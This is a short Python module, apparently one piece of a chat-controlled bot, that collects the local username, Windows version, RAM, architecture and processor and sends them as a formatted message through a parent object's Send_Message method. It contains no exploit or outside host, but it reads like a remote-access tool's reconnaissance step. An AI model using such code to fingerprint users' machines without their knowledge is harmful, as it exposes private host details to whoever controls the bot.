from getpass import *
from psutil import virtual_memory
from platform import uname , processor , machine
class Sys_Info():
	def __init__(self, _):
		self._ = _
		self.Main()

	def Main(self):
		result = "%F0%9F%96%A5 System Info : \n"
		result += "%E2%9D%96 Username : " + getuser() + "\n"
		result += "%E2%9D%96 OS Version : Windows " + uname()[2] + "\n"
		result += "%E2%9D%96 RAM : " + str(round(virtual_memory().total / (1024.0 **3)))+" GB" + "\n"
		result += "%E2%9D%96 Bit : " + machine() + "\n"
		result += "%E2%9D%96 Processor : " + processor()
		self._.Send_Message(result)

